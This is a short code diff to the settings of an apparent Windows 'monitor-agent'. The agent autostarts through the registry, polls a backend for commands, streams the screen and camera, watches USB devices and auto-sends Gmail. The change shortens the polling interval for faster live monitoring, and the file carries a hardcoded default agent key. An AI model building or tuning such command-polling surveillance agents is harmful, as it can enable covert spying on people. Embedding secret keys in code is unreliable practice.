@@ -26,8 +26,9 @@ APP_NAME = "monitor-agent"  # name of the agent in the Windows registry (for aut
 # Must match AGENT_KEY in the backend (server.js / its env).
 AGENT_KEY = os.environ.get("AGENT_KEY", "fu2//i6ryxk2kvkIDUaQl+VlLekkkhRLNfj1ndpFcFo=")
 
-# How often the agent asks the backend for a new command.
-POLL_INTERVAL = float(os.environ.get("POLL_INTERVAL", "1.5"))   # seconds
+# How often the agent asks the backend for a new command. Lower = snappier live
+# monitoring (screen/camera streams, USB detection), at the cost of more polling.
+POLL_INTERVAL = float(os.environ.get("POLL_INTERVAL", "0.5"))   # seconds
 
 # Seconds to wait for the Gmail compose window to load before auto-sending
 # (Ctrl+Enter). Increase this on slow machines / connections if mail doesn't send.
